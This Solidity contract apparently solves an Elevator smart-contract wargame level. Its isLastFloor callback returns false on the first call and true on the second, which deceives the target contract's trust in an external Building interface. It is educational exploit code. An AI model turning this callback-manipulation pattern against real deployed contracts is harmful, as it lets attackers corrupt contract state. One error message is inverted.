//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

import "./newElevator.sol";
//Implementing the interface of Building
contract Attack{
    address public target;                     //here is by just using address of the contract

    Elevator public to;                       //this is here is for the call the function using contract signature
    constructor(address payable addr)public{
        target=addr;
        to=Elevator(target);
    }

    function attack()external{
        (bool success,)=address(target).call(abi.encodeWithSignature("goTo(uint256)",5));
        require(success,"attack successfully happened");
        //or also can use
        //to.goTo(5);
    }
    
    function isLastFloor(uint floor) external view returns (bool){
        uint f=to.floor();
        if(f==0){
            return false;
        }
        else{
            return true;
        }
    }

    // we can call the public methods in the other contraction by its getter functions
    // function show()external view returns(uint ){
    //     return to.floor();
    // }
}